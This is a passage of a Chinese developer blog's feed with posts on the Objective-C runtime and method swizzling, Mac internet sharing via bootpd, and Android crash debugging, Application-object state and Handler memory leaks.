//类名<br>    long version;<br>    long info;<br>    long instance_size<br>    struct objc_ivar_list </em>ivars //成员变量列表<br>    struct objc_method_list <strong>methodLists; //方法列表<br>    struct objc_cache <em>cache;//缓存<br>    //一种优化，调用过的方法存入缓存列表，下次调用先找缓存<br>    struct objc_protocol_list </em>protocols //协议列表<br>    #endif<br>} OBJC2_UNAVAILABLE;<br>/<em> Use <code>Class</code> instead of `struct objc_class </em>` <em>/</em></strong></code></pre><br><h2>获取列表</h2><br>有时候会有这样的需求，我们需要知道当前类中每个属性的名字（比如字典转模型，字典的Key和模型对象的属性名字不匹配）。<br>我们可以通过runtime的一系列方法获取类的一些信息（包括属性列表，方法列表，成员变量列表，和遵循的协议列表）。<br><pre><code>  unsigned int count;<br>    //获取属性列表<br>    objc_property_t propertyList = class_copyPropertyList([self class], &amp;count);<br>    for (unsigned int i=0; i&lt;count; i++) {<br>        const char <em>propertyName = property_getName(propertyList[i]);<br>        NSLog(@”property—-&gt;%@”, [NSString stringWithUTF8String:propertyName]);<br>    }<br><br>    //获取方法列表<br>    Method </em>methodList = class_copyMethodList([self class], &amp;count);<br>    for (unsigned int i; i&lt;count; i++) {<br>        Method method = methodList[i];<br>        NSLog(@”method—-&gt;%@”, NSStringFromSelector(method_getName(method)));<br>    }<br><br>    //获取成员变量列表<br>    Ivar <em>ivarList = class_copyIvarList([self class], &amp;count);<br>    for (unsigned int i; i&lt;count; i++) {<br>        Ivar myIvar = ivarList[i];<br>        const char </em>ivarName = ivar_getName(myIvar);<br>        NSLog(@”Ivar—-&gt;%@”, [NSString stringWithUTF8String:ivarName]);<br>    }<br><br>    //获取协议列表<br>    __unsafe_unretained Protocol protocolList = class_copyProtocolList([self class], &amp;count);<br>    for (unsigned int i; i&lt;count; i++) {<br>        Protocol <em>myProtocal = protocolList[i];<br>        const char </em>protocolName = protocol_getName(myProtocal);<br>        NSLog(@”protocol—-&gt;%@”, [NSString stringWithUTF8String:protocolName]);<br>    }</code></pre><br>在Xcode上跑一下看看输出吧，需要给你当前的类写几个属性，成员变量，方法和协议，不然获取的列表是没有东西的。<br>注意，调用这些获取列表的方法别忘记导入头文件<code>#import &lt;objc/runtime.h&gt;</code>。<br><h2>方法调用</h2><br>让我们看一下方法调用在运行时的过程（参照前文类在runtime中的表示）<br><br><strong>如果用实例对象调用实例方法，会到实例的isa指针指向的对象（也就是类对象）操作。<br>如果调用的是类方法，就会到类对象的isa指针指向的对象（也就是元类对象）中操作。</strong><br><ol><br>    <li>首先，在相应操作的对象中的缓存方法列表中找调用的方法，如果找到，转向相应实现并执行。</li><br>    <li>如果没找到，在相应操作的对象中的方法列表中找调用的方法，如果找到，转向相应实现执行</li><br>    <li>如果没找到，去父类指针所指向的对象中执行1，2.</li><br>    <li>以此类推，如果一直到根类还没找到，转向拦截调用。</li><br>    <li>如果没有重写拦截调用的方法，程序报错。</li><br></ol><br><strong>以上的过程给我带来的启发：</strong><br><ul><br>    <li>重写父类的方法，并没有覆盖掉父类的方法，只是在当前类对象中找到了这个方法后就不会再去父类中找了。</li><br>    <li>如果想调用已经重写过的方法的父类的实现，只需使用<code>super</code>这个编译器标识，它会在运行时跳过在当前的类对象中寻找方法的过程。</li><br></ul><br><h2>拦截调用</h2><br>在方法调用中说到了，如果没有找到方法就会转向拦截调用。<br>那么什么是拦截调用呢。<br>拦截调用就是，在找不到调用的方法程序崩溃之前，你有机会通过重写<code>NSObject</code>的四个方法来处理。<br><pre><code>+ (BOOL)resolveClassMethod:(SEL)sel;<br>+ (BOOL)resolveInstanceMethod:(SEL)sel;<br>//后两个方法需要转发到其他的类处理<br>- (id)forwardingTargetForSelector:(SEL)aSelector;<br>- (void)forwardInvocation:(NSInvocation <em>)anInvocation;</em></code></pre><br><ul><br>    <li>第一个方法是当你调用一个不存在的类方法的时候，会调用这个方法，默认返回NO，你可以加上自己的处理然后返回YES。</li><br>    <li>第二个方法和第一个方法相似，只不过处理的是实例方法。</li><br>    <li>第三个方法是将你调用的不存在的方法重定向到一个其他声明了这个方法的类，只需要你返回一个有这个方法的target。</li><br>    <li>第四个方法是将你调用的不存在的方法打包成<code>NSInvocation</code>传给你。做完你自己的处理后，调用<code>invokeWithTarget:</code>方法让某个target触发这个方法。</li><br></ul><br><h2>动态添加方法</h2><br>重写了拦截调用的方法并且返回了YES，我们要怎么处理呢？<br>有一个办法是根据传进来的<code>SEL</code>类型的selector动态添加一个方法。<br><br>首先从外部隐式调用一个不存在的方法：<br><pre><code>//隐式调用方法<br>[target performSelector:@selector(resolveAdd:) withObject:@”test”];</code></pre><br>然后，在target对象内部重写拦截调用的方法，动态添加方法。<br><pre><code>void runAddMethod(id self, SEL _cmd, NSString string){<br>    NSLog(@”add C IMP “, string);<br>}<br>+ (BOOL)resolveInstanceMethod:(SEL)sel{<br><br>    //给本类动态添加一个方法<br>    if ([NSStringFromSelector(sel) isEqualToString:@”resolveAdd:”]) {<br>        class_addMethod(self, sel, (IMP)runAddMethod, “v@:<em>“);<br>    }<br>    return YES;<br>}</em></code></pre><br>其中<code>class_addMethod</code>的四个参数分别是：<br><ol><br>    <li><code>Class cls</code> 给哪个类添加方法，本例中是self</li><br>    <li><code>SEL name</code> 添加的方法，本例中是重写的拦截调用传进来的selector。</li><br>    <li><code>IMP imp</code> 方法的实现，C方法的方法实现可以直接获得。如果是OC方法，可以用<code>+ (IMP)instanceMethodForSelector:(SEL)aSelector;</code>获得方法的实现。</li><br>    <li><code>“v@:“</code>方法的签名，代表有一个参数的方法。</li><br></ol><br><h2>关联对象</h2><br>现在你准备用一个系统的类，但是系统的类并不能满足你的需求，你需要额外添加一个属性。<br>这种情况的一般解决办法就是继承。<br>但是，只增加一个属性，就去继承一个类，总是觉得太麻烦类。<br>这个时候，runtime的关联属性就发挥它的作用了。<br><pre><code>//首先定义一个全局变量，用它的地址作为关联对象的key<br>static char associatedObjectKey;<br>//设置关联对象<br>objc_setAssociatedObject(target, &amp;associatedObjectKey, @”添加的字符串属性”, OBJC_ASSOCIATION_RETAIN_NONATOMIC); //获取关联对象<br>NSString <em>string = objc_getAssociatedObject(target, &amp;associatedObjectKey);<br>NSLog(@”AssociatedObject = %@”, string);</em></code></pre><br><code>objc_setAssociatedObject</code>的四个参数：<br><ol><br>    <li><code>id object</code>给谁设置关联对象。</li><br>    <li><code>const void key</code>关联对象唯一的key，获取时会用到。</li><br>    <li><code>id value</code>关联对象。</li><br>    <li><code>objc_AssociationPolicy</code>关联策略，有以下几种策略：</li><br></ol><br><pre><code>enum {<br>    OBJC_ASSOCIATION_ASSIGN = 0,<br>    OBJC_ASSOCIATION_RETAIN_NONATOMIC = 1,<br>    OBJC_ASSOCIATION_COPY_NONATOMIC = 3,<br>    OBJC_ASSOCIATION_RETAIN = 01401,<br>    OBJC_ASSOCIATION_COPY = 01403<br>};</code></pre><br>如果你熟悉OC，看名字应该知道这几种策略的意思了吧。<br><br><code>objc_getAssociatedObject</code>的两个参数。<br><ol><br>    <li><code>id object</code>获取谁的关联对象。</li><br>    <li><code>const void *key</code>根据这个唯一的key获取关联对象。</li><br></ol><br>其实，你还可以把添加和获取关联对象的方法写在你需要用到这个功能的类的类别中，方便使用。<br><pre><code>//添加关联对象<br>- (void)addAssociatedObject:(id)object{<br>    objc_setAssociatedObject(self, @selector(getAssociatedObject), object, OBJC_ASSOCIATION_RETAIN_NONATOMIC);<br>}<br>//获取关联对象<br>- (id)getAssociatedObject{<br>    return objc_getAssociatedObject(self, _cmd);<br>}</code></pre><br><strong>注意：</strong>这里面我们把<code>getAssociatedObject</code>方法的地址作为唯一的key，<code>_cmd</code>代表当前调用方法的地址。<br><h2>方法交换</h2><br>方法交换，顾名思义，就是将两个方法的实现交换。例如，将A方法和B方法交换，调用A方法的时候，就会执行B方法中的代码，反之亦然。<br>话不多说，这是参考Mattt大神在NSHipster上的文章自己写的代码。<br><pre><code>#import “UIViewController+swizzling.h”<br>#import &lt;objc/runtime.h&gt;<br><br>@implementation UIViewController (swizzling)<br><br>//load方法会在类第一次加载的时候被调用<br>//调用的时间比较靠前，适合在这个方法里做方法交换<br>+ (void)load{<br>    //方法交换应该被保证，在程序中只会执行一次<br>    static dispatch_once_t onceToken;<br>    dispatch_once(&amp;onceToken, ^{<br><br>        //获得viewController的生命周期方法的selector<br>        SEL systemSel = @selector(viewWillAppear:);<br>        //自己实现的将要被交换的方法的selector<br>        SEL swizzSel = @selector(swiz_viewWillAppear:);<br>        //两个方法的Method<br>        Method systemMethod = class_getInstanceMethod([self class], systemSel);<br>        Method swizzMethod = class_getInstanceMethod([self class], swizzSel);<br><br>        //首先动态添加方法，实现是被交换的方法，返回值表示添加成功还是失败<br>        BOOL isAdd = class_addMethod(self, systemSel, method_getImplementation(swizzMethod), method_getTypeEncoding(swizzMethod));<br>        if (isAdd) {<br>            //如果成功，说明类中不存在这个方法的实现<br>            //将被交换方法的实现替换到这个并不存在的实现<br>            class_replaceMethod(self, swizzSel, method_getImplementation(systemMethod), method_getTypeEncoding(systemMethod));<br>        }else{<br>            //否则，交换两个方法的实现<br>            method_exchangeImplementations(systemMethod, swizzMethod);<br>        }<br><br>    });<br>}<br><br>- (void)swiz_viewWillAppear:(BOOL)animated{<br>    //这时候调用自己，看起来像是死循环<br>    //但是其实自己的实现已经被替换了<br>    [self swiz_viewWillAppear:animated];<br>    NSLog(@”swizzle”);<br>}<br><br>@end</code></pre><br>在一个自己定义的viewController中重写viewWillAppear<br><pre><code>- (void)viewWillAppear:(BOOL)animated{<br>    [super viewWillAppear:animated];<br>    NSLog(@”viewWillAppear”);<br>}</code></pre><br>Run起来看看输出吧！<br><br><strong>我的理解：</strong><br><ul><br>    <li>方法交换对于我来说更像是实现一种思想的最佳技术：AOP面向切面编程。</li><br>    <li>既然是切面，就一定不要忘记，交换完再调回自己。</li><br>    <li>一定要保证只交换一次，否则就会很乱。</li><br>    <li>最后，据说这个技术很危险，谨慎使用。</li><br></ul><br><h3>完</h3><br></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;/p&gt;&lt;h1&gt;iOS~runtime理解&lt;/h1&gt;&lt;p&gt;&lt;/p&gt;
&lt;div&gt;原文链接：&lt;a href=&quot;http://www.jianshu.com/p/927c8384855a&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jia
    
    </summary>
    
      <category term="iOS" scheme="http://blog.pickbox.me/categories/iOS/"/>
    
    
  </entry>
  
  <entry>
    <title>SSL握手</title>
    <link href="http://blog.pickbox.me/2015/04/06/SSL%E6%8F%A1%E6%89%8B/"/>
    <id>http://blog.pickbox.me/2015/04/06/SSL握手/</id>
    <published>2015-04-06T02:38:28.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://img.pickbox.me/wp-content/uploads/SSL_handshake_with_two_way_authentication_with_certificates.svg" target="_blank" rel="external"><img class="alignnone size-large wp-image-1174" alt="SSL_handshake_with_two_way_authentication_with_certificates" src="http://img.pickbox.me/wp-content/uploads/SSL_handshake_with_two_way_authentication_with_certificates.svg"></a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://img.pickbox.me/wp-content/uploads/SSL_handshake_with_two_way_authentication_with_certificates.svg&quot; target=&quot;_blank&quot; rel=&quot;e
    
    </summary>
    
      <category term="Network" scheme="http://blog.pickbox.me/categories/Network/"/>
    
    
  </entry>
  
  <entry>
    <title>How do I share internet to 2nd router through Mac?</title>
    <link href="http://blog.pickbox.me/2015/03/27/How-do-I-share-internet-to-2nd-router-through-Mac/"/>
    <id>http://blog.pickbox.me/2015/03/27/How-do-I-share-internet-to-2nd-router-through-Mac/</id>
    <published>2015-03-27T10:19:53.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Mac配置：Mac通过USB无线网卡连接外网，还有一个有线网口<br>目标：共享Mac无线网络，让另一台路由连接Mac有线网，上外网</p>
<p>步骤：</p>
<ol>
<li>Make sure the 2nd router is off for now</li>
<li>Go to Dock/Finder–&gt;Preferences–&gt;Sharing</li>
<li>(Assuming OSX 10.7＋) Highlight the 2nd-to-last option (Internet Sharing)–&gt;Select ‘Wi-Fi’ from the ‘Share your connection from’ drop-box</li>
<li>Click the check-box next to ‘Ethernet’ in the ‘To computers using:’ section and click the check-box next to ‘Internet Sharing’ to finally enable it.</li>
<li>Connect the ethernet cable from your Mac to your router’s WAN/Internet port and turn your 2nd router on.</li>
</ol>
<p>Assuming that 2nd router is set up for DHCP it should now see your ethernet-connected Mac as its gateway and use it as its internet source.</p>
<p><a href="http://img.pickbox.me/wp-content/uploads/network-share-for-Mac.png" target="_blank" rel="external"><img class="alignnone size-full wp-image-1166" alt="network share for Mac" src="http://img.pickbox.me/wp-content/uploads/network-share-for-Mac.png" width="699" height="564"></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>这样设置之后，会生成/etc/bootpd.plist</p>
<p>&nbsp;</p>
<pre>$ cat /etc/bootpd.plist 
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Subnets&lt;/key&gt;
    &lt;array&gt;
        &lt;dict&gt;
            &lt;key&gt;_creator&lt;/key&gt;
            &lt;string&gt;com.apple.NetworkSharing&lt;/string&gt;
            &lt;key&gt;allocate&lt;/key&gt;
            &lt;true/&gt;
            &lt;key&gt;dhcp_domain_name_server&lt;/key&gt;
            &lt;array&gt;
                &lt;string&gt;192.168.2.1&lt;/string&gt;
            &lt;/array&gt;
            &lt;key&gt;dhcp_router&lt;/key&gt;
            &lt;string&gt;192.168.2.1&lt;/string&gt;
            &lt;key&gt;interface&lt;/key&gt;
            &lt;string&gt;bridge100&lt;/string&gt;
            &lt;key&gt;lease_max&lt;/key&gt;
            &lt;integer&gt;86400&lt;/integer&gt;
            &lt;key&gt;lease_min&lt;/key&gt;
            &lt;integer&gt;86400&lt;/integer&gt;
            &lt;key&gt;name&lt;/key&gt;
            &lt;string&gt;192.168.2/24&lt;/string&gt;
            &lt;key&gt;net_address&lt;/key&gt;
            &lt;string&gt;192.168.2.0&lt;/string&gt;
            &lt;key&gt;net_mask&lt;/key&gt;
            &lt;string&gt;255.255.255.0&lt;/string&gt;
            &lt;key&gt;net_range&lt;/key&gt;
            &lt;array&gt;
                &lt;string&gt;192.168.2.2&lt;/string&gt;
                &lt;string&gt;192.168.2.254&lt;/string&gt;
            &lt;/array&gt;
        &lt;/dict&gt;
    &lt;/array&gt;
    &lt;key&gt;bootp_enabled&lt;/key&gt;
    &lt;false/&gt;
    &lt;key&gt;detect_other_dhcp_server&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;bridge100&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;dhcp_enabled&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;bridge100&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;dhcp_ignore_client_identifier&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;ignore_allow_deny&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;bridge100&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;use_server_config_for_dhcp_options&lt;/key&gt;
    &lt;false/&gt;
&lt;/dict&gt;
&lt;/plist&gt;</pre>
可以通过如下命令启动／关闭dhcp服务
<pre>sudo launchctl load -w /System/Library/LaunchDaemons/bootps.plist
sudo launchctl unload -w /System/Library/LaunchDaemons/bootps.plist</pre>
&nbsp;

配置bootptab设置为路由配置固定IP地址
<pre>$ cat /etc/bootptab 
%%
# machine entries have the following format:
#
# hostname      hwtype  hwaddr              ipaddr          bootfile
newifi-wan      1       EC:0E:C4:0F:EA:79   192.168.2.100</pre>
看看路由

<pre>$ netstat -nr
Routing tables

Internet:
Destination        Gateway            Flags        Refs      Use   Netif Expire
default            172.22.152.1       UGSc           27     7247     en2
default            link#7             UCSI            0        0 bridge1
127                127.0.0.1          UCS             0        0     lo0
127.0.0.1          127.0.0.1          UH              4   325589     lo0
169.254            link#6             UCS             0        0     en2
172.22.152/23      link#6             UCS             0        0     en2
172.22.152.1/32    link#6             UCS             1        0     en2
172.22.152.1       a4:93:4c:89:c6:4b  UHLWIir        27        0     en2    786
172.22.152.55/32   link#6             UCS             0        0     en2
192.168.2          link#7             UC              1        0 bridge1
192.168.2.100      ec.e.c4.f.ea.79    UHLWIi          3      264 bridge1   1170</pre>

<p>&nbsp;<br>ifconfig 可以看到多了一个bridge100</p>
<pre>bridge100: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500
    options=3&lt;RXCSUM,TXCSUM&gt;
    ether c6:34:6b:42:de:64 
    inet 192.168.2.1 netmask 0xffffff00 broadcast 192.168.2.255
    inet6 fe80::c434:6bff:fe42:de64%bridge100 prefixlen 64 scopeid 0x7 
    Configuration:
        id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0
        maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200
        root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0
        ipfilter disabled flags 0x2
    member: en0 flags=3&lt;LEARNING,DISCOVER&gt;
            ifmaxaddr 0 port 4 priority 0 path cost 0
    nd6 options=1&lt;PERFORMNUD&gt;
    media: autoselect
    status: active</pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mac配置：Mac通过USB无线网卡连接外网，还有一个有线网口&lt;br&gt;目标：共享Mac无线网络，让另一台路由连接Mac有线网，上外网&lt;/p&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Make sure the 2nd router is off for now&lt;/li&gt;
&lt;
    
    </summary>
    
      <category term="Mac OS X" scheme="http://blog.pickbox.me/categories/Mac-OS-X/"/>
    
    
  </entry>
  
  <entry>
    <title>【zz】Android NDK开发Crash错误定位</title>
    <link href="http://blog.pickbox.me/2015/03/19/%E3%80%90zz%E3%80%91Android-NDK%E5%BC%80%E5%8F%91Crash%E9%94%99%E8%AF%AF%E5%AE%9A%E4%BD%8D/"/>
    <id>http://blog.pickbox.me/2015/03/19/【zz】Android-NDK开发Crash错误定位/</id>
    <published>2015-03-19T03:33:58.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>NDK安装包中提供了三个调试工 具：addr2line、objdump和ndk-stack</p>
<p>参考：<a href="http://android.jobbole.com/80685/" target="_blank">http://android.jobbole.com/80685/</a>  (<a href="http://img.pickbox.me/wp-content/uploads/Android-NDK开发Crash错误定位.pdf" target="_blank" rel="external">PDF下载</a>)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;NDK安装包中提供了三个调试工 具：addr2line、objdump和ndk-stack&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://android.jobbole.com/80685/&quot; target=&quot;_blank&quot;&gt;http://android.jobbol
    
    </summary>
    
      <category term="Android" scheme="http://blog.pickbox.me/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>【zz】为什么不能往Android的Application对象里存储数据</title>
    <link href="http://blog.pickbox.me/2015/03/13/%E3%80%90zz%E3%80%91%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E5%BE%80Android%E7%9A%84Application%E5%AF%B9%E8%B1%A1%E9%87%8C%E5%AD%98%E5%82%A8%E6%95%B0%E6%8D%AE/"/>
    <id>http://blog.pickbox.me/2015/03/13/【zz】为什么不能往Android的Application对象里存储数据/</id>
    <published>2015-03-13T09:03:22.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>在一个App里面总有一些数据需要在多个地方用到。这些数据可能是一个 session token，一次费时计算的结果等。通常为了避免activity之间传递对象的开销 ，这些数据一般都会<a href="http://developer.android.com/guide/topics/data/data-storage.html" target="_blank">保存到持久化存储里面</a>。</p>
<p>有人建议将这些数据保存到 <a href="https://developer.android.com/reference/android/app/Application.html" target="_blank">Application</a> 对象里面，这样这些数据对所有应用内的activities可用。这种方法简单，优雅而且……完全扯淡。</p>
<p>假设把你的数据都保存到Application对象里面去了，那么你的应用最后会以一个NullPointerException 异常crash掉。</p>
<p></p><h2>一个简单的测试案例</h2><p></p>
<p></p><h4>代码</h4><br>Application 对象：<p></p>
<p><pre>// access modifiers omitted for brevity<br>class MyApplication extends Application {</pre></p>
<pre><code>String name;

String getName() {
    return name;
}

void setName(String name) {
    this.name = name;
}
</code></pre><p>}<br>第一个activity，我们往application对象里面存储了用户姓名：</p>
<p><pre>// access modifiers omitted for brevity<br>class WhatIsYourNameActivity extends Activity {</pre></p>
<pre><code>void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.writing);

    // Just assume that in the real app we would really ask it!
    MyApplication app = (MyApplication) getApplication();
    app.setName(&quot;Developer Phil&quot;);
    startActivity(new Intent(this, GreetLoudlyActivity.class));

}
</code></pre><p>}<br>第二个activity，我们调用第一个activity设置并存在application里面的用户姓名：</p>
<p><pre>// access modifiers omitted for brevity<br>class GreetLoudlyActivity extends Activity {</pre></p>
<pre><code>TextView textview;

void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.reading);
    textview = (TextView) findViewById(R.id.message);
}

void onResume() {
    super.onResume();

    MyApplication app = (MyApplication) getApplication();
    textview.setText(&quot;HELLO &quot; + app.getName().toUpperCase());
}
</code></pre><p>}</p>
<p></p><h4>测试场景</h4><p></p>
<p><ol><br>    <li>用户启动app。</li><br>    <li>在 <em>WhatIsYourNameActivity</em>里面，要求用户输入姓名，并存储到 <em>MyApplication。</em></li><br>    <li>在 <em>GreetLoudlyActivity</em>里面，你从<em>MyApplication</em> 对象中获得用户姓名，并且显示。</li><br>    <li>用户按home键离开这个app。</li><br>    <li>几个小时后，Android系统为了回收内存kill掉了这个app。到目前为止，一切尚好。接下来就是crash的部分了…</li><br>    <li>用户重新打开这个App。</li><br>    <li>Android系统创建一个新的 <em>MyApplication</em> 实例并恢复 <em>GreetLoudlyActivity</em>。</li><br>    <li><em>GreetLoudlyActivity</em> 从新的 <em>MyApplication</em> 实例中获取用户姓名，可得到的为空，最后导致NullPointerException。</li><br></ol></p>
<p></p><h2>为什么会Crash?</h2><br>在上面这个例子中，app会crash得原因是这个 Application 对象是全新的，所以这个name 变量里面的值为 null，当调用<em>String#toUpperCase()</em> 方法时就导致了NullPointerException。<p></p>
<p>整个问题的核心在于：application 对象不会一直呆着内存里面，它会被kill掉。与大家普遍的看法不同之处在于，实际上app不会重新开始启动。Android系统会创建一个新的Application 对象，然后启动上次用户离开时的activity以造成这个app从来没有被kill掉得假象。</p>
<p>你以为你的application可以保存数据，却没想到你的用户在没有打开activity A 之前就就直接打开了 activity B ，于是你就收到了一个 crash 的 surprise。</p>
<p></p><h2>有哪些替代方法呢？</h2><br>这里没啥神奇的解决方法，你可以试试下面几种方法：<p></p>
<p><ul><br>    <li>直接将数据通过intent传递给 Activity 。</li><br>    <li>使用<a href="http://developer.android.com/guide/topics/data/data-storage.html" target="_blank">官方推荐的几种方式</a>将数据持久化到磁盘上。</li><br>    <li>在使用数据的时候总是要对变量的值进行非空检查。</li><br></ul></p>
<p></p><h2>如果模拟App被Kill掉</h2><br><em>更新: <a href="http://daniel-codes.blogspot.ca/" target="_blank">Daniel Lew</a>指出，kill app更简单的方式就是使用DDMS里面“停止进程” 。你在调试你的应用的时候可以使用这招。</em><p></p>
<p>为了测试这个，你必须使用一个Android模拟器或者一台root过的Android手机。</p>
<p><ol><br>    <li>使用home按钮退出app。</li><br>    <li>在终端里：</li></ol></p>
<p><pre># find the process id<br>adb shell ps</pre></p>
<h1 id="then-find-the-line-with-the-package-name-of-your-app"><a href="#then-find-the-line-with-the-package-name-of-your-app" class="headerlink" title="then find the line with the package name of your app"></a>then find the line with the package name of your app</h1><h1 id="Mac-Unix-save-some-time-by-using-grep"><a href="#Mac-Unix-save-some-time-by-using-grep" class="headerlink" title="Mac/Unix: save some time by using grep:"></a>Mac/Unix: save some time by using grep:</h1><p>adb shell ps | grep your.app.package</p>
<h1 id="The-result-should-look-like"><a href="#The-result-should-look-like" class="headerlink" title="The result should look like:"></a>The result should look like:</h1><h1 id="USER-PID-PPID-VSIZE-RSS-WCHAN-PC-NAME"><a href="#USER-PID-PPID-VSIZE-RSS-WCHAN-PC-NAME" class="headerlink" title="USER      PID   PPID  VSIZE  RSS     WCHAN    PC         NAME"></a>USER      PID   PPID  VSIZE  RSS     WCHAN    PC         NAME</h1><h1 id="u0-a198-21997-160-827940-22064-ffffffff-00000000-S-your-app-package"><a href="#u0-a198-21997-160-827940-22064-ffffffff-00000000-S-your-app-package" class="headerlink" title="u0_a198   21997 160   827940 22064 ffffffff 00000000 S your.app.package"></a>u0_a198   21997 160   827940 22064 ffffffff 00000000 S your.app.package</h1><h1 id="Kill-the-app-by-PID"><a href="#Kill-the-app-by-PID" class="headerlink" title="Kill the app by PID"></a>Kill the app by PID</h1><p>adb shell kill -9 21997</p>
<h1 id="the-app-is-now-killed"><a href="#the-app-is-now-killed" class="headerlink" title="the app is now killed"></a>the app is now killed</h1><p><br>    <li>长按home按钮回到之前的app。<br>你现在是处于一个新的application实例中了。</li><br></p>
<p></p><h2>总结</h2><br>不要在application对象里面储存数据，这容易出错，导致你的app crash。<br>要么将你后面要用的数据保存到磁盘上面或者保存到intent得extra里面直接传递给activity 。<p></p>
<p>这些结论不但对application对象有用，对你app里面的单例对象（singleton）或者公共静态变量（<span style="color: #ff0000;">public static</span>）同样适用。</p>
<p>&nbsp;</p>
<p></p><h2>原文链接</h2><br><a href="http://android.jobbole.com/80643/" target="_blank">为什么不能往Android的Application对象里存储数据</a><p></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在一个App里面总有一些数据需要在多个地方用到。这些数据可能是一个 session token，一次费时计算的结果等。通常为了避免activity之间传递对象的开销 ，这些数据一般都会&lt;a href=&quot;http://developer.android.com/guide/t
    
    </summary>
    
      <category term="Android" scheme="http://blog.pickbox.me/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>防止Handler导致的内存泄露</title>
    <link href="http://blog.pickbox.me/2015/03/13/%E9%98%B2%E6%AD%A2Handler%E5%AF%BC%E8%87%B4%E7%9A%84%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2/"/>
    <id>http://blog.pickbox.me/2015/03/13/防止Handler导致的内存泄露/</id>
    <published>2015-03-13T08:49:35.000Z</published>
    <updated>2016-10-15T05:24:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>先来看一段代码：</p>
<pre>
public class MyActivity extends Activity {
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    if (savedInstanceState == null) {
      setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
    }
    Handler handler = new Handler(Looper.getMainLooper());
    handler.post(new Runnable() {
      public void run() {
        doSomething();
      }
    });
  }

  void doSomething() {
    // Uses the activity instance
  }
}
</pre>

<p>上面的代码会导致doSomething()方法在Activity因为一个configuration change导致 onDestroy() 方法被调用之后执行，使得activity对象无法及时释放</p>
<p>解决方案：<br>1.Handler的处理逻辑放到一个独立的class文件，并使用WeakReference引用activity，避免类似doSomething直接引用到activity的情景发生<br>2.onDestroy之前通过handler.removeCallbacks() 方法从消息队列移除这个消息<br>3.避免使用static Handler</p>
<p>参考：《<a href="http://android.jobbole.com/80638/" target="_blank">Android在横竖屏切换时到底发生了什么</a>》<br><a href="http://img.pickbox.me/wp-content/uploads/A-journey-on-the-Android-Main-Thread-Lifecycle-bits.pdf" target="_blank" rel="external">PDF版</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先来看一段代码：&lt;/p&gt;
&lt;pre&gt;
public class MyActivity extends Activity {
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(s
    
    </summary>
    
      <category term="Android" scheme="http://blog.pickbox.me/categories/Android/"/>
    
    
  </entry>
  
</feed>
